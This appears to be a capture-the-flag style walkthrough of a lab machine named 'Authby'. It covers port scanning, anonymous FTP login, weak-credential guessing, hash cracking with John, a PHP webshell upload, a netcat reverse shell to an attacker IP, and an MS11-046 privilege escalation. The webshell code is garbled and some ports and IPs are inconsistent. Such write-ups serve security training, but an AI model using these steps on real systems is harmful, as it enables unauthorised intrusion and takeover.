# Authby
## FTP, John, .htaccess, 
## nmap
```
sudo nmap -Pn -n $IP -sC -sV -p- --open
Sudo as it defaults to the faster half-open SYN scan
-Pn to ignore ping and assume it is up
-n to ignore DNS
-sC for default scripts
-sV for version information
-p- to scan all ports
The -- open argument to only apply scripts and version scans to found open ports.

When the TCP scan finishes, immediately run a UDP scan. You may want to do all ports with masscan. 
sudo nmap -Pn -n $IP -sU --top-ports=100

Scanning the UDP ports as well is best practice. Maybe Simple Network Management Protocol (SNMP) is available.
```
## FTP
```
We are able to log in anonymously and retrieve a username: admin.
We then try a basic username as password check and gain access to the user’s FTP server with the following credentials: admin/admin

Download the files: .htpasswd and .htaccess
Locate the username and the hashed password in file .htpasswd.
From the .htaccess file we find that the FTP directory is in the root directory of the WordPress site.
utilize John the ripper to crack the user’s hashed password
```
## John
```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
offsec:elite
```
## Port 242
```
Access the login page on port 242 utilizing the newfound credentials: offsec:elite
```
## PHP Webshell RCE to Reverse Shell
```
Port 21
The .htaccess file is located in the root directory.
Create a file named “simplephpbackdoor.php” with the following contents on our Kali machine:
“; $cmd = ($_REQUEST[‘cmd’]); system($cmd); echo “”; die; }?>

We then log into the admin FTP server and upload the simplephpbackdoor.php file.

Port 242
We then navigate to the correct url and confirm remote code execution (RCE):
http://192.168.69.46:242/simplephpbackdoor.php?cmd=dir
```
## Reverse Shell
```
Port 21
Upload a netcat binary to admin’s FTP server.
Start a netcat listener running on port 3145 on our Kali machine.
Navigate to your phpwebshell and receive a shell running as a user:
http://192.168.69.x:242/simplephpbackdoor.php?cmd=nc 192.18.69.127 9090 -e cmd
```
## Local Enumeration
```
Paying attention to the shell you can see the windows running is from 2006. A good reason to check for hotfixes.
Via systeminfo we find the system is not patched for vulnerability MS11–046.
MS11-046: Vulnerability in Ancillary Function Driver Could Allow Elevation of Privileg
Google the exploit and find the precompiled version and download it on our Kali machine.
https://github.com/secWiki/window-kernel-exploits

Transfer the compiled MS11–046 binary onto the system and receive a CMD running as NT authority (system).
```










